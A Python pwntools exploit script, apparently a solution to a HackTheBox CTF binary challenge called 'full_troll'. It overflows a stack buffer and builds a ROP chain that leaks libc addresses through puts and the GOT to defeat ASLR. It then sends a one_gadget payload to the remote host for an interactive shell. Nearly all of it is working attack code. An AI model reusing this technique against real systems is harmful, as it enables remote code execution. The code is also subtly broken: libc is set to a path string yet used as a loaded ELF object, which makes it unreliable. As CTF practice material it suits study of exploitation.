from pwn import *
from struct import pack

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF('./full_troll')
context.binary = './full_troll'
libc = ("/lib/x86_64-linux-gnu/libc-2.30.so")

##########################################################################
# Find Offset
##########################################################################

initials = b'VibEv7xCXyK8AjPPRjwtp9X' + b' '*9 + b'\0secret.txt\0'

# r = elf.process()
# crash = cyclic(1024)
# r.recvline()
# r.clean()
# r.sendline(initials+crash)
# r.wait()
# core = r.corefile
# rsp = core.rsp
# offset = core.read(rsp, 4)
# offset =  cyclic_find(offset)
offset = 73 - len(initials)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

### Find manually
crashOffset = offset	

### 0x7fffffffd7e8 is just some random value in stack space, just so RBP is valid
junk = nops*(crashOffset - 8) + p64(0x7fffffffd7e8) # Override RBP
poprdi = p64(0x4006d3) # from ROPgadget

### elf.got contains pointers containing actual addresses of query functions
puts = p64(elf.got['puts'])
fgets = p64(elf.got['fgets'])

### elf.symbols contains addresses of functions (and stubs as here)
putsret = p64(elf.symbols['puts'])
mainret = p64(elf.symbols['main'])

##########################################################################
# Demo ==> (poprdi + puts + putsret) 
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################

### This Payload prints puts and gets addressed and calls main function again
payload = b''.join([junk, \
    poprdi, puts, putsret, \
    poprdi, fgets, putsret, \
    mainret])

#r = elf.process()
r = remote('docker.hackthebox.eu', 38422)
#gdb.attach(r.pid, """c""")

print(r.readline())
print(r.clean())

r.sendline(payload)

##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
fgets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
print("puts: ", hex(puts_leak))
print("fgets: ", hex(fgets_leak))

puts_offset = libc.symbols['puts']
libc_base = puts_leak - puts_offset
# This address must be 0x1000 aligned, if not, its Probably wrong!
print("libc base: ", hex(libc_base))
if(libc_base & 0x000000000000ffff):
    print("ALERT! Program is probably using different libc than specified!")

##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

# sys_offset = p64(0x45390 + libc_base)
one_gadget = p64( 0x4526a + libc_base) # from one_gadget

npayload = b''.join([junk, \
    one_gadget, padding*8])

r.clean()

r.sendline(npayload)
# Get Interactive shell
r.interactive()
